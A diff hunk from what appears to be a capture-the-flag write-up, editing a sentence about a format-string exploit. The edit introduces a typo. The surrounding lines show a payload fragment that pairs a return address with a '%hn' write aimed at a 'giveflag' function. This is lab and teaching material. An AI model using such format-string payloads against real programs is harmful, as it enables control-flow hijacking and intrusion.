@@ -41,7 +41,7 @@ and our second payload is just the return address which can be calculated after 
 # 4 bytes
 second_name = retaddr
 
-Since it isn't null terminated, the first 4 bytes will be replaced with the initial '%%%%' and the result string will be:
+Since it isn't null terminated, the first 4 bytes will reaplce with the initial '%%%%' and the result string will be:
 
 retaddr + '%0'+str((giveflag&0xffff)-4)+'d%'+str(ownoffset)+'$hn'                                 
 
